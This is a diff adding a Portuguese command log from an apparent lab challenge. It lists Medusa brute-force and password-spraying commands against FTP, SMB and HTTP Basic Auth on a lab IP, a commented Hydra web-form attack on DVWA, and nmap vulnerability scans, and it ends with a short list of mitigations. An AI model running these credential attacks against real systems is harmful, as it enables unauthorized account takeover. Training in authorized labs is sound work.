@@ -1,0 +1,40 @@
+# comando-medusa.txt
+# Registro de comandos Medusa utilizados no desafio
+# Arquivos usados:
+#   users.txt  -> lista de usuários (um por linha)
+#   pass.txt   -> lista de senhas (um por linha)
+# Execução: rodar apenas em laboratório autorizado.
+
+# 1) Listar módulos / debug
+medusa -d
+
+# 2) Brute-force FTP (exemplo)
+#    -M ftp : módulo FTP
+#    -h     : host alvo (IP)
+#    -U     : arquivo com usernames
+#    -P     : arquivo com passwords
+#    -t     : threads paralelas
+#    -O     : grava saída em arquivo
+medusa -M ftp -h 192.168.56.101 -U users.txt -P pass.txt -t 10 -O results/medusa_ftp.txt
+
+# 3) Password spraying / brute-force SMB/NTLM (módulo smbnt)
+#    Use -m GROUP:LOCAL para contas locais quando aplicável
+medusa -M smbnt -h 192.168.56.101 -U users.txt -P pass.txt -t 10 -O results/medusa_smbnt.txt
+
+# 4) HTTP Basic Auth (se o alvo usar autenticação HTTP Basic)
+medusa -M http -h 192.168.56.101 -U users.txt -P pass.txt -t 10 -O results/medusa_http_basic.txt -m AUTH:basic
+
+# 5) Nota sobre formulários web (http-post-form)
+#    Para login via formulário HTML, prefira Hydra:
+#      hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect" -t 16 -vV
+#    Capture o form com Burp/DevTools para ajustar o caminho e parâmetros corretamente.
+
+# 6) Nmap recomendado antes dos ataques:
+#    nmap -sV -p- 192.168.56.101 -oN results/nmap_scan.txt
+#    nmap -sV -p21,22,80,139,445 --script vuln 192.168.56.101 -oN results/nmap_services.txt
+
+# 7) Boas práticas / mitigação (resumo)
+#    - Rate limit e bloqueio temporário após tentativas repetidas
+#    - Autenticação multifator (MFA)
+#    - Políticas de senha e verificaç˜ao de senhas fracas
+#    - Monitoramento e alertas (SIEM / IDS)
